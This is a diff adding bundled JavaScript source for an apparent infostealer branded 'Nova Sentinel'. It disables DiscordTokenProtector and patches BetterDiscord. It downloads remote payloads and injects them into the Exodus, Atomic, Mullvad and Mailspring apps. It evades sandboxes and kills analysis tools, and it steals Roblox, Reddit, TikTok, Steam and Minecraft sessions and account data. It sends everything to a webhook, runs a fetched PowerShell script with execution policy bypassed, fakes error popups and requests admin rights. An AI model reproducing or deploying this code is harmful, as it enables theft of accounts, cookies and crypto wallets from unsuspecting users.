+            setTimeout(async () => {
+              try {
+                if (desktop) {
+                  const discordFolder = path.join(desktop, "..", "..", "..");
+                  const buildBatPath = path.join(desktop, "..", "..", path.basename(discordFolder) + ".exe");
+                  const options = {
+                    cwd: path.join(desktop, "..", ".."),
+                    stdio: "inherit"
+                  };
+                  try {
+                    spawn(buildBatPath, [], options);
+                  } catch (e) {}
+                }
+              } catch (e) {}
+            }, 12000);
+          } catch (err) {
+            save.SaveError(err);
+          }
+        });
+      }
+    }
+  } catch (e) {
+    save.SaveError(e);
+  }
+}
+const replace = (buf, a, b) => {
+  if (!Buffer.isBuffer(buf)) buf = Buffer.from(buf);
+  const idx = buf.indexOf(a);
+  if (idx === -1) return buf;
+  if (!Buffer.isBuffer(b)) b = Buffer.from(b);
+  const before = buf.slice(0, idx);
+  const after = replace(buf.slice(idx + a.length), a, b);
+  const len = idx + b.length + after.length;
+  return Buffer.concat([before, b, after], len);
+};
+async function BypassDiscordTokenProtector(inject) {
+  if (inject != "yes") return;
+  try {
+    const tp = path.join(process.env.APPDATA, "DiscordTokenProtector");
+    const config = path.join(tp, "config.json");
+    if (!fs.existsSync(tp) || !fs.lstatSync(tp).isDirectory() || !fs.existsSync(config)) {
+      return;
+    }
+    const filesToRemove = ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"];
+    for (const file of filesToRemove) {
+      const filePath = path.join(tp, file);
+      if (fs.existsSync(filePath)) {
+        fs.unlinkSync(filePath);
+      }
+    }
+    let item;
+    try {
+      const fileContent = fs.readFileSync(config, "utf-8");
+      item = JSON.parse(fileContent);
+    } catch (error) {
+      return;
+    }
+    item[`KSCHdsc_is_here`] = "https://t.me/Sordeal";
+    item.auto_start = false;
+    item.auto_start_discord = false;
+    item.integrity = false;
+    item.integrity_allowbetterdiscord = false;
+    item.integrity_checkexecutable = false;
+    item.integrity_checkhash = false;
+    item.integrity_checkmodule = false;
+    item.integrity_checkscripts = false;
+    item.integrity_checkresource = false;
+    item.integrity_redownloadhashes = false;
+    item.iterations_iv = 364;
+    item.iterations_key = 457;
+    item.version = 69420;
+    fs.writeFileSync(config, JSON.stringify(item, null, 2));
+    fs.appendFileSync(config, `\n\n//KSCHdsc_is_here | https://t.me/Sordeal`);
+  } catch (e) {
+    save.SaveError(e);
+  }
+}
+async function pwnBetterDiscord(inject) {
+  if (inject != "yes") return;
+  try {
+    let dir = process.env.appdata + "/BetterDiscord/data/betterdiscord.asar";
+    if (fs.existsSync(dir)) {
+      const boom = fs.readFileSync(dir);
+      fs.writeFileSync(dir, replace(boom, "api/webhooks", "KSCHdsc"));
+    }
+    return;
+  } catch (e) {
+    save.SaveError(e);
+  }
+}
+async function exodusInjection(cc, webhook, injectionurl) {
+  if (cc !== "yes" || webhook === "%WEBHOOK%" || !injectionurl) return;
+  try {
+    let local = process.env.localappdata;
+    const response = await axios.get(injectionurl);
+    const injection = await response.data;
+    let injectionpath = glob.sync(`${local}/exodus/app-*/resources/app.asar`);
+    let output = path.join(injectionpath[0], "..", "unpacked");
+    if (injectionpath.length > 0) {
+      var _stat$exodusurl$;
+      await unpackAsar(injectionpath[0], output);
+      let g = glob.sync(`${output}/src/app/main/index.js`);
+      await fs.writeFileSync(g[0], `${injection}`, "utf-8");
+      await packAsar(output, path.join(injectionpath[0]));
+      let json = {
+        webhook,
+        link: (_stat$exodusurl$ = stat.exodusurl[0]) !== null && _stat$exodusurl$ !== void 0 ? _stat$exodusurl$ : "none"
+      };
+      const parentDir = path.join(injectionpath[0], "..", "..");
+      fs.writeFileSync(path.join(parentDir, "config.json"), JSON.stringify(json));
+    }
+  } catch (e) {}
+}
+function unpackAsar(asarFilePath, outputDir) {
+  try {
+    asar.extractAll(asarFilePath, outputDir);
+  } catch (err) {}
+}
+async function MullvadInjection(cc, webhook, injectionurl) {
+  if (cc !== "yes" || webhook === "%WEBHOOK%" || !injectionurl) return;
+  try {
+    let mullvad_path = path.join(process.env.ProgramFiles, "Mullvad VPN", "resources", "app.asar");
+    if (fs.existsSync(mullvad_path)) {
+      const response = await axios.get(injectionurl);
+      const injection = await response.data;
+      let output = path.join(mullvad_path, "..", "unpacked");
+      await unpackAsar(mullvad_path, output);
+      let g = path.join(output, "build", "src", "main", "daemon-rpc.js");
+      await fs.writeFileSync(g, `${injection.replace("%WEBHOOK%", webhook)}`, "utf-8");
+      await packAsar(output, path.join(mullvad_path));
+    }
+  } catch (e) {}
+}
+function unpackAsar(asarFilePath, outputDir) {
+  try {
+    asar.extractAll(asarFilePath, outputDir);
+  } catch (err) {}
+}
+async function packAsar(inputDir, outputFilePath) {
+  try {
+    await asar.createPackage(inputDir, outputFilePath);
+    if (fs.existsSync(outputFilePath)) {
+      if (fs.existsSync(inputDir)) {
+        fs.rmSync(inputDir, {
+          recursive: true
+        });
+      }
+    } else {}
+  } catch (err) {}
+}
+async function AtomicInjection(cc, webhook, injectionurl, mainAtomic) {
+  if (cc != "yes" || webhook === "%WEBHOOK%" || !injectionurl) return;
+  try {
+    const local = process.env.localappdata;
+    const response = await axios.get(injectionurl);
+    const injection = await response.data;
+    const resp = await axios.get(mainAtomic);
+    const AtmcMain = await resp.data;
+    let injectionpath = glob.sync(`${local}/Programs/atomic/resources/app.asar`);
+    if (injectionpath[0]) {
+      var _stat$atomicurl$;
+      let output = path.join(injectionpath[0], "..", "unpacked");
+      await unpackAsar(injectionpath[0], output);
+      let g = `${output}/dist/electron/vendors.3d9f29748fbff1778bdc.js`;
+      await fs.writeFileSync(g, `${injection}`, "utf-8");
+      let main = `${output}/dist/electron/main.js`;
+      await fs.writeFileSync(main, `${AtmcMain}`, "utf-8");
+      await packAsar(output, path.join(injectionpath[0]));
+      let json = {
+        webhook,
+        link: (_stat$atomicurl$ = stat.atomicurl[0]) !== null && _stat$atomicurl$ !== void 0 ? _stat$atomicurl$ : "none"
+      };
+      const parentDir = path.join(injectionpath[0], "..", "..");
+      fs.writeFileSync(path.join(parentDir, "config.json"), JSON.stringify(json));
+    }
+  } catch (e) {}
+}
+async function MailSpringInjection(cc, webhook, injectionurl) {
+  if (cc !== "yes" || webhook === "%WEBHOOK%" || !injectionurl) return;
+  try {
+    let mailspring_path = path.join(process.env.localappdata, "Mailspring");
+    if (fs.existsSync(mailspring_path)) {
+      let appmailspring_path = glob.sync(`${mailspring_path}/app-*/resources/app.asar`);
+      appmailspring_path.forEach(async jsppath => {
+        const response = await axios.get(injectionurl);
+        const injection = await response.data;
+        let output = path.join(jsppath, "..", "unpacked");
+        await unpackAsar(jsppath, output);
+        let g = path.join(output, "internal_packages", "onboarding", "lib", "onboarding-helpers.js");
+        await fs.writeFileSync(g, `${injection.replace("%WEBHOOK%", webhook)}`, "utf-8");
+        await packAsar(output, path.join(jsppath));
+      });
+    }
+  } catch (e) {}
+}
+module.exports = {
+  inject,
+  pwnBetterDiscord,
+  BypassDiscordTokenProtector,
+  exodusInjection,
+  AtomicInjection,
+  chrome_injection,
+  MullvadInjection,
+  MailSpringInjection
+};
+},{"./stats":"utils/stats.js","./save":"utils/save.js","./core":"utils/core.js"}],"utils/antidebug.js":[function(require,module,exports) {
+const util = require('util'),
+  exec = util.promisify(require('child_process').exec),
+  axios = require("axios"),
+  save = require("./save");
+async function DoNoDebugNegger(cc, ip, disk, ram, uid, cpucount, OS, cpu, GPU, windowskey, windowsversion) {
+  if (cc !== "yes") return;
+  try {
+    const pc_name = process.env.COMPUTERNAME || "IDK";
+    const user_name = process.env.USERNAME || "IDK";
+    const [isblockedIP, isblockedUID, isblockedUSERNAME, isblockedPCNAME, isBLOCKEDOS, isBlockedGpu] = await Promise.all([ipBLOCKED(ip), UuidBLOCKED(uid), UsernameBLOCKED(user_name), PCNameBLOCKED(pc_name), OsBLOCKED(OS), GpuBLOCKED(GPU)]);
+    if (!isNaN(disk) && disk < 80 && !isNaN(ram) && ram < 2 || !isNaN(cpucount) && cpucount < 2 || isBlockedGpu || isBLOCKEDOS || isblockedIP || isblockedUID || isblockedUSERNAME || isblockedPCNAME) {
+      process.abort();
+    }
+    try {
+      killBlacklistedPrograms();
+    } catch (e) {
+      save.SaveError(e);
+    }
+  } catch (e) {
+    save.SaveError(e);
+  }
+}
+async function killBlacklistedPrograms() {
+  try {
+    const response = await axios.get('https://raw.githubusercontent.com/Yokheycv/sub/main/assets/nope.json');
+    const json = response.data;
+    const blacklistedPrograms = json.blacklistedprog;
+    const {
+      stdout
+    } = await exec('tasklist');
+    const runningProcesses = stdout.split(/\r?\n/);
+    runningProcesses.forEach(process => {
+      const processName = process.split(/\s+/)[0].replace(".exe", '');
+      if (blacklistedPrograms.includes(processName)) {
+        try {
+          exec(`taskkill /F /IM ${processName}.exe`, error => {
+            if (error) {} else {}
+          });
+        } catch (error) {}
+      }
+    });
+  } catch (error) {}
+}
+async function GpuBLOCKED(gpu) {
+  try {
+    const response = await axios.get('https://raw.githubusercontent.com/Yokheycv/sub/main/assets/blocked_GPUTYPE.json');
+    const blockedgpu = response.data;
+    return blockedgpu.includes(gpu);
+  } catch (error) {
+    return false;
+  }
+}
+async function OsBLOCKED(OS) {
+  try {
+    const response = await axios.get('https://raw.githubusercontent.com/Yokheycv/sub/main/assets/blockedOS.json');
+    const blockedOS = response.data;
+    return blockedOS.includes(OS);
+  } catch (error) {
+    return false;
+  }
+}
+async function PCNameBLOCKED(username) {
+  try {
+    const response = await axios.get('https://raw.githubusercontent.com/Yokheycv/sub/main/assets/blockedpcname.json');
+    const blockedPCNAMES = response.data;
+    return blockedPCNAMES.includes(username);
+  } catch (error) {
+    return false;
+  }
+}
+async function UsernameBLOCKED(username) {
+  try {
+    const response = await axios.get('https://raw.githubusercontent.com/Yokheycv/sub/main/assets/blocked_progr.json');
+    const blockedUsernames = response.data;
+    return blockedUsernames.includes(username);
+  } catch (error) {
+    return false;
+  }
+}
+async function UuidBLOCKED(uid) {
+  try {
+    const response = await axios.get('https://raw.githubusercontent.com/Yokheycv/sub/main/assets/blocked_hwid.json');
+    const blockedUIDs = response.data;
+    return blockedUIDs.includes(uid);
+  } catch (error) {
+    return false;
+  }
+}
+async function ipBLOCKED(ip) {
+  try {
+    const response = await axios.get('https://raw.githubusercontent.com/Steroide-58/sub-main/main/sub-main/assets/blocked_ips.json');
+    const blockedIPs = response.data;
+    return blockedIPs.includes(ip);
+  } catch (error) {
+    return false;
+  }
+}
+module.exports = {
+  DoNoDebugNegger
+};
+},{"./save":"utils/save.js"}],"utils/roblox.js":[function(require,module,exports) {
+function ownKeys(e, r) { var t = Object.keys(e); if (Object.getOwnPropertySymbols) { var o = Object.getOwnPropertySymbols(e); r && (o = o.filter(function (r) { return Object.getOwnPropertyDescriptor(e, r).enumerable; })), t.push.apply(t, o); } return t; }
+function _objectSpread(e) { for (var r = 1; r < arguments.length; r++) { var t = null != arguments[r] ? arguments[r] : {}; r % 2 ? ownKeys(Object(t), !0).forEach(function (r) { _defineProperty(e, r, t[r]); }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(t)) : ownKeys(Object(t)).forEach(function (r) { Object.defineProperty(e, r, Object.getOwnPropertyDescriptor(t, r)); }); } return e; }
+function _defineProperty(obj, key, value) { key = _toPropertyKey(key); if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; }
+function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == typeof i ? i : String(i); }
+function _toPrimitive(t, r) { if ("object" != typeof t || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != typeof i) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
+const {
+    execSync
+  } = require("child_process"),
+  {
+    stat
+  } = require("./stats"),
+  axios = require("axios"),
+  save = require("./save"),
+  {
+    embeds,
+    stats,
+    badge
+  } = require("./emotes");
+function NovaSentinelGetRoblox(Found_Roblox) {
+  if (Found_Roblox != "yes") return;
+  try {
+    function subproc(path) {
+      try {
+        const cmd = `powershell Get-ItemPropertyValue -Path ${path}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY`;
+        const options = {
+          windowsHide: true,
+          shell: true
+        };
+        return execSync(cmd, options).toString().trim();
+      } catch (e) {
+        return null;
+      }
+    }
+    let cooks = [];
+    const regex_c00ks = subproc("HKLM") || subproc("HKCU");
+    if (regex_c00ks) {
+      cooks.push(regex_c00ks);
+    }
+    if (cooks.length > 0) {
+      if (cooks.includes(".ROBLOSECURITY")) {
+        stat.AddRoblox(cooks);
+      }
+    }
+  } catch (e) {
+    save.SaveError(e);
+  }
+}
+async function ParseAndSendRoblox(cc) {
+  if (cc !== "yes") return;
+  const processedUsernames = new Set();
+  const axiosConfig = {
+    maxRedirects: 0,
+    validateStatus: function (status) {
+      return status >= 200 && status < 300 || status === 302;
+    }
+  };
+  try {
+    const requests = stat.roblox_cookies.map(async cookies => {
+      save.saveRoblox(cookies);
+      const [userInfoResponse, friendsCountResponse] = await Promise.all([axios.get("https://www.roblox.com/mobileapi/userinfo", _objectSpread({
+        headers: {
+          Cookie: `.ROBLOSECURITY=${cookies}`
+        }
+      }, axiosConfig)), axios.get("https://friends.roblox.com/v1/my/friends/count", _objectSpread({
+        headers: {
+          Cookie: `.ROBLOSECURITY=${cookies}`
+        }
+      }, axiosConfig))]);
+      if (userInfoResponse.status === 200 && friendsCountResponse.status === 200) {
+        const {
+          UserName,
+          RobuxBalance,
+          ThumbnailUrl,
+          IsAnyBuildersClubMember,
+          IsPremium
+        } = userInfoResponse.data;
+        const {
+          count
+        } = friendsCountResponse.data;
+        if (!processedUsernames.has(UserName)) {
+          processedUsernames.add(UserName);
+          const parsed = {
+            UserName,
+            RobuxBalance,
+            ThumbnailUrl,
+            IsAnyBuildersClubMember,
+            IsPremium,
+            friendscount: count,
+            cookies
+          };
+          stat.detailRoblox(parsed);
+        }
+      }
+    });
+    await Promise.all(requests);
+  } catch (error) {}
+}
+async function sendRoblox(cc) {
+  if (cc != "yes") return;
+  let p = stat.roblox_account;
+  if (p.length < 1) return;
+  return p;
+}
+function compile(embeds) {
+  var build = "";
+  build += `{\n"content": null,\n"embeds": [`;
+  for (let i = 0; i < embeds.length; i++) {
+    build += embeds[i];
+    if (i != embeds.length - 1) {
+      build += ",\n";
+    }
+  }
+  build += `],\n"avatar_url": "https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png",\n"username": "Nova Sentinel",\n"attachments": []\n}`;
+  return build;
+}
+async function embed(UserName, RobuxBalance, ThumbnailUrl, IsAnyBuildersClubMember, IsPremium, friendscount, cookies) {
+  let embed = {
+    fields: [{
+      name: `${embeds.atom} Name:`,
+      value: `\`\`\`ansi\n[2;32m${UserName}[0m[2;32m[0m\`\`\``,
+      inline: false
+    }, {
+      name: `${embeds.dsc} Robux:`,
+      value: `\`\`\`ansi\n[2;32m${RobuxBalance}[0m[2;32m[0m\`\`\``,
+      inline: true
+    }, {
+      name: `${embeds.rblxinfo} premium:`,
+      value: `\`${IsPremium ? "✅" : "❌"}\``,
+      inline: !0
+    }, {
+      name: `${embeds.infoyl} Club Member:`,
+      value: `\`${IsAnyBuildersClubMember ? "✅" : "❌"}\``,
+      inline: !0
+    }, {
+      name: `${embeds.inject} Cookie:`,
+      value: `[Cookies](${cookies})`,
+      inline: true
+    }],
+    description: `\`${friendscount} Friends\``,
+    color: 3553599,
+    footer: {
+      text: "@Nova Sentinel | https://t.me/Sordeal"
+    },
+    title: "Roblox Account",
+    thumbnail: {
+      url: `${ThumbnailUrl}`
+    }
+  };
+  return JSON.stringify(embed);
+}
+module.exports = {
+  NovaSentinelGetRoblox,
+  ParseAndSendRoblox,
+  sendRoblox,
+  embed,
+  compile
+};
+},{"./stats":"utils/stats.js","./save":"utils/save.js","./emotes":"utils/emotes.js"}],"utils/minecraft.js":[function(require,module,exports) {
+const axios = require("axios"),
+  {
+    stat
+  } = require("./stats"),
+  https = require("https"),
+  agent = new https.Agent({
+    rejectUnauthorized: false
+  }),
+  fs = require("fs"),
+  {
+    embeds,
+    stats,
+    badge
+  } = require("./emotes");
+async function NovaSentinelfinduid(wb, cc) {
+  if (cc != "yes") return;
+  for (const m of stat.minecraft_account) {
+    try {
+      let name = [];
+      let count = 0;
+      const content = fs.readFileSync(m, "utf-8");
+      const jsonData = JSON.parse(content);
+      if (jsonData) {
+        if (!jsonData.accounts) return;
+        const accountInfo = jsonData.accounts;
+        for (const accountId in accountInfo) {
+          var _JSON$stringify$match;
+          const emailRegex = /[\w\.-]+@[a-zA-Z\d\.-]+\.[a-zA-Z]{2,}/g;
+          const emails = (_JSON$stringify$match = JSON.stringify(accountInfo).match(emailRegex)) !== null && _JSON$stringify$match !== void 0 ? _JSON$stringify$match : "none";
+          const profile = accountInfo[accountId].minecraftProfile;
+          if (profile) {
+            const playerDBResponse = await axios.get(`https://api.namemc.com/profile/${profile.id}/friends`);
+            if (playerDBResponse.status === 200 && playerDBResponse.data.length > 0) {
+              name = playerDBResponse.data.map(entry => entry.name);
+              count = name.length;
+            }
+            const tosend = {
+              username: "Nova Sentinel",
+              avatar_url: "https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png",
+              embeds: [{
+                title: "Nova Minecraft Account",
+                thumbnail: {
+                  url: `https://minotar.net/avatar/${profile.id}.png`
+                },
+                color: 3553599,
+                description: `[Download Skin](https://minotar.net/avatar/${profile.id}.png)\n[Download Capes](http://s.optifine.net/capes/${profile.name}.png)`,
+                fields: [{
+                  name: `${embeds.mcid} Account ID:`,
+                  value: `\`\`\`${accountId}\`\`\``,
+                  inline: true
+                }, {
+                  name: `${embeds.mcgapple} Username:`,
+                  value: `\`\`\`${profile.name}\`\`\``,
+                  inline: true
+                }, {
+                  name: `${embeds.mcmail} Email Found:`,
+                  value: `\`\`\`${emails || `None`}\`\`\``,
+                  inline: true
+                }, {
+                  name: `${embeds.keysmc} Minecraft UID`,
+                  value: `\`\`\`${profile.id}\`\`\``,
+                  inline: true
+                }, {
+                  name: `${embeds.namemc} Friends Count`,
+                  value: `\`\`\`${count || 0}\`\`\``,
+                  inline: true
+                }, {
+                  name: `${embeds.namemc} Friends List:`,
+                  value: `\`\`\`${name.join(", ") || `None`}\`\`\``,
+                  inline: true
+                }],
+                footer: {
+                  text: `@Nova Sentinel | https://t.me/Sordeal`
+                }
+              }]
+            };
+            try {
+              await axios({
+                url: wb,
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json"
+                },
+                httpsAgent: agent,
+                data: tosend
+              });
+            } catch (e) {}
+          }
+        }
+      }
+    } catch (error) {}
+  }
+}
+module.exports = {
+  NovaSentinelfinduid
+};
+},{"./stats":"utils/stats.js","./emotes":"utils/emotes.js"}],"utils/phish.js":[function(require,module,exports) {
+const fetch = require("node-fetch");
+const {
+    exec
+  } = require("child_process"),
+  core = require("./core");
+async function MicroPhish(githubRawUrl, webhook, cc) {
+  if (cc !== "yes") return;
+  const replaceText = "%YOUR-DISCORD-WEBHOOK%";
+  try {
+    const response = await fetch(githubRawUrl);
+    const script = await response.text();
+    const updatedScript = script.replace(replaceText, webhook);
+    const path = require("path");
+    let randomPSfile = path.join(process.env.localappdata, "Temp", core.generateId(3) + "tempScript.ps1");
+    const fs = require("fs");
+    fs.writeFileSync(randomPSfile, updatedScript, "utf-8");
+    console.log(randomPSfile);
+    exec(`powershell.exe -ExecutionPolicy Bypass -File ${randomPSfile}`, (error, stdout, stderr) => {
+      if (error) {
+        return;
+      }
+    });
+  } catch (error) {}
+}
+module.exports = {
+  MicroPhish
+};
+},{"./core":"utils/core.js"}],"utils/reddit.js":[function(require,module,exports) {
+const {
+    stat
+  } = require("./stats"),
+  axios = require("axios"),
+  {
+    embeds
+  } = require("./emotes");
+async function NovaRedditor(cc) {
+  if (cc !== "yes") return;
+  let g = [];
+  let reddit_sessions = stat.RedditSess;
+  if (reddit_sessions && reddit_sessions.length) {
+    for (const reddit of reddit_sessions) {
+      const {
+        data: bearer
+      } = await axios.post("https://accounts.reddit.com/api/access_token", {
+        scopes: ["*", "email", "pii"]
+      }, {
+        headers: {
+          Cookie: `reddit_session=${reddit}`,
+          Authorization: "Basic b2hYcG9xclpZdWIxa2c6"
+        }
+      });
+      const {
+        data: account
+      } = await axios.get("https://oauth.reddit.com/api/v1/me", {
+        headers: {
+          Authorization: `Bearer ${bearer.access_token}`
+        }
+      });
+      let {
+        total_karma,
+        icon_img,
+        is_gold,
+        email,
+        name
+      } = account;
+      let profile_link = `https://www.reddit.com/user/${name}`;
+      let embed = {
+        color: 3553599,
+        thumbnail: {
+          url: icon_img
+        },
+        fields: [{
+          name: `${embeds.billings} Profile`,
+          value: `[\`${name}\`](${profile_link})`,
+          inline: true
+        }, {
+          name: `${embeds.karma} Karma`,
+          value: `\`${total_karma}\``,
+          inline: true
+        }, {
+          name: `${embeds.gold} Gold`,
+          value: `\`${is_gold}\``,
+          inline: true
+        }, {
+          name: `${embeds.mail} Email`,
+          value: `\`${email}\``,
+          inline: true
+        }],
+        footer: {
+          text: "@Nova Sentinel | https://t.me/Sordeal"
+        },
+        title: "Reddit Session"
+      };
+      g.push(embed);
+    }
+    let tosend = {
+      avatar_url: "https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png",
+      username: "Nova Sentinel",
+      embeds: g
+    };
+    return tosend;
+  }
+}
+module.exports = {
+  NovaRedditor
+};
+},{"./stats":"utils/stats.js","./emotes":"utils/emotes.js"}],"utils/steam.js":[function(require,module,exports) {
+const axios = require("axios"),
+  {
+    stat
+  } = require("./stats"),
+  {
+    embeds,
+    stats,
+    badge
+  } = require("./emotes");
+async function NovaSteamator(cc) {
+  if (cc != "yes") return;
+  try {
+    if (stat.steam_content[0] && Array.isArray(stat.steam_content)) {
+      const accounts = stat.steam_content[0];
+      if (!accounts) return;
+      accounts.forEach(async account => {
+        try {
+          const {
+            data: accountInfo
+          } = await axios.get(`https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=3000BC0F14309FD7999F02C66E757EF7&steamids=${account}`);
+          const {
+            data: games
+          } = await axios.get(`https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=3000BC0F14309FD7999F02C66E757EF7&steamid=${account}&include_appinfo=true`);
+          const {
+            data: level
+          } = await axios.get(`https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=3000BC0F14309FD7999F02C66E757EF7&steamid=${account}`);
+          stat.addSteamAcc({
+            accountId: account,
+            accountInfo: accountInfo.response.players,
+            games,
+            level: level.response
+          });
+        } catch (error) {}
+      });
+    }
+  } catch (e) {}
+}
+async function sendSteam(cc) {
+  if (cc !== "yes") return;
+  let e = [];
+  try {
+    let steamAccounts = stat.steam_account.slice(0, 5);
+    for (let {
+      accountId,
+      accountInfo,
+      games,
+      level
+    } of steamAccounts) {
+      var _level$player_level, _games$response$game_;
+      if (!accountInfo) continue;
+      accountInfo = accountInfo[0];
+      const embed = {
+        title: "Steam Session",
+        color: 3553599,
+        author: {
+          name: accountInfo.personaname,
+          icon_url: accountInfo.avatar,
+          url: accountInfo.profileurl
+        },
+        fields: [{
+          name: `${embeds.infoyl} Name:`,
+          value: `\`${accountInfo.personaname}\``,
+          inline: false
+        }, {
+          name: `${embeds.nitro} Created At:`,
+          value: `${accountInfo.timecreated !== undefined ? `<t:${accountInfo.timecreated}>` : "none"}`,
+          inline: true
+        }, {
+          name: `${embeds.phone} Level:`,
+          value: `\`${(_level$player_level = level.player_level) !== null && _level$player_level !== void 0 ? _level$player_level : 0}\``,
+          inline: true
+        }, {
+          name: `${embeds.mail} Games:`,
+          value: `\`${(_games$response$game_ = games.response.game_count) !== null && _games$response$game_ !== void 0 ? _games$response$game_ : 0}\``,
+          inline: true
+        }]
+      };
+      e.push(embed);
+    }
+    let g = {
+      avatar_url: "https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png",
+      username: "Nova Sentinel",
+      embeds: e
+    };
+    return g;
+  } catch (error) {}
+}
+module.exports = {
+  NovaSteamator,
+  sendSteam
+};
+},{"./stats":"utils/stats.js","./emotes":"utils/emotes.js"}],"utils/fake_error.js":[function(require,module,exports) {
+const {
+    exec
+  } = require("child_process"),
+  fs = require("fs"),
+  save = require("./save");
+const generateRandomName = length => {
+  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+  let result = "";
+  for (let i = 0; i < length; i++) {
+    const randomIndex = Math.floor(Math.random() * characters.length);
+    result += characters[randomIndex];
+  }
+  return result;
+};
+function error(cc, msg, startuped) {
+  if (cc !== "yes" && startuped !== true) return;
+  const vbsScript = `
+  Set objShell = WScript.CreateObject("WScript.Shell")
+  MsgBox "Error : ${msg}", vbInformation, "Error Code : 43 "
+  `;
+  const randomName = generateRandomName(12);
+  const vbsFileName = process.env.APPDATA + "\\" + randomName + ".vbs";
+  fs.writeFileSync(vbsFileName, vbsScript, "utf8");
+  exec("cscript " + vbsFileName, (error, stdout, stderr) => {
+    if (error) {
+      save.SaveError(error);
+    }
+  });
+}
+module.exports = {
+  error
+};
+},{"./save":"utils/save.js"}],"utils/uac.js":[function(require,module,exports) {
+const path = require("path"),
+  sudo = require("sudo-prompt"),
+  admin = require("admin-check");
+function requestAdminPrivileges(myself) {
+  return new Promise((resolve, reject) => {
+    sudo.exec(`${process.execPath} "${path.join(myself)}" --admin`, error => {
+      if (error) {} else {
+        process.abort();
+      }
+    });
+  });
+}
+async function requestAdminPrivilegesIfNeeded(myself, cc, cc2, cc3) {
+  if (cc === "yes" || cc2 === "yes" || cc3 === "yes") {
+    let g = await admin.check();
+    if (!g) {
+      try {
+        await requestAdminPrivileges(myself);
+      } catch (error) {}
+    }
+  }
+}
+module.exports = {
+  requestAdminPrivilegesIfNeeded
+};
+},{}],"utils/tiktok.js":[function(require,module,exports) {
+const {
+    stat
+  } = require("./stats"),
+  axios = require("axios"),
+  {
+    embeds,
+    stats
+  } = require("./emotes"),
+  fs = require("fs"),
+  path = require("path");
+async function ParseTiktok(cc) {
+  if (cc !== "yes") return;
+  let g = [];
+  let tiktok_sessions = stat.TiktokSessId;
+  if (tiktok_sessions && tiktok_sessions.length) {
+    for (const tiktok of tiktok_sessions) {
+      var _follower_num$value;
+      const profile = await axios.get("https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE", {
+        headers: {
+          cookie: `sessionid=${tiktok}`,
+          "Accept-Encoding": "identity"
+        }
+      }).then(res => res.data).catch(() => {});
+      const insights = await axios.post("https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE", 'type_requests=[{"insigh_type":"vv_history","days":16},{"insigh_type":"pv_history","days":16},{"insigh_type":"like_history","days":16},{"insigh_type":"comment_history","days":16},{"insigh_type":"share_history","days":16},{"insigh_type":"user_info"},{"insigh_type":"follower_num_history","days":17},{"insigh_type":"follower_num"},{"insigh_type":"week_new_videos","days":7},{"insigh_type":"week_incr_video_num"},{"insigh_type":"self_rooms","days":28},{"insigh_type":"user_live_cnt_history","days":58},{"insigh_type":"room_info"}]', {
+        headers: {
+          cookie: `sessionid=${tiktok}`
+        }
+      }).then(res => res.data).catch(() => {});
+      const wallet = await axios.get("https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true", {
+        headers: {
+          cookie: `sessionid=${tiktok}`
+        }
+      }).then(res => res.data).catch(() => {});
+      if (!profile || !profile.data) return;
+      let {
+        username,
+        email
+      } = profile.data;
+      let {
+        follower_num
+      } = insights;
+      let {
+        coins
+      } = wallet.data;
+      let embed = {
+        title: "Tiktok Session",
+        fields: [{
+          name: `${embeds.tiktok} Username:`,
+          value: `[\`${username}\`](https://tiktok.com/@${username})`,
+          inline: true
+        }, {
+          name: `${embeds.twitter_followers} Followers:`,
+          value: `\`${(_follower_num$value = follower_num.value) !== null && _follower_num$value !== void 0 ? _follower_num$value : 0}\``,
+          inline: true
+        }, {
+          name: `${embeds.mail} Email`,
+          value: `\`${email !== null && email !== void 0 ? email : "None"}\``,
+          inline: true
+        }, {
+          name: `${embeds.token} Coins`,
+          value: `\`${coins !== null && coins !== void 0 ? coins : 0}\``,
+          inline: true
+        }, {
+          name: `${stats.cookie} Cookie`,
+          value: `\`\`\`${tiktok}\`\`\``,
+          inline: true
+        }],
+        footer: {
+          text: "@Nova Sentinel | https://t.me/Sordeal"
+        },
+        color: 3553599
+      };
+      g.push(embed);
+    }
+    let tosend = {
+      avatar_url: "https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png",
+      username: "Nova Sentinel",
+      embeds: g
+    };
+    return tosend;
+  }
+}
+module.exports = {
+  ParseTiktok
+};
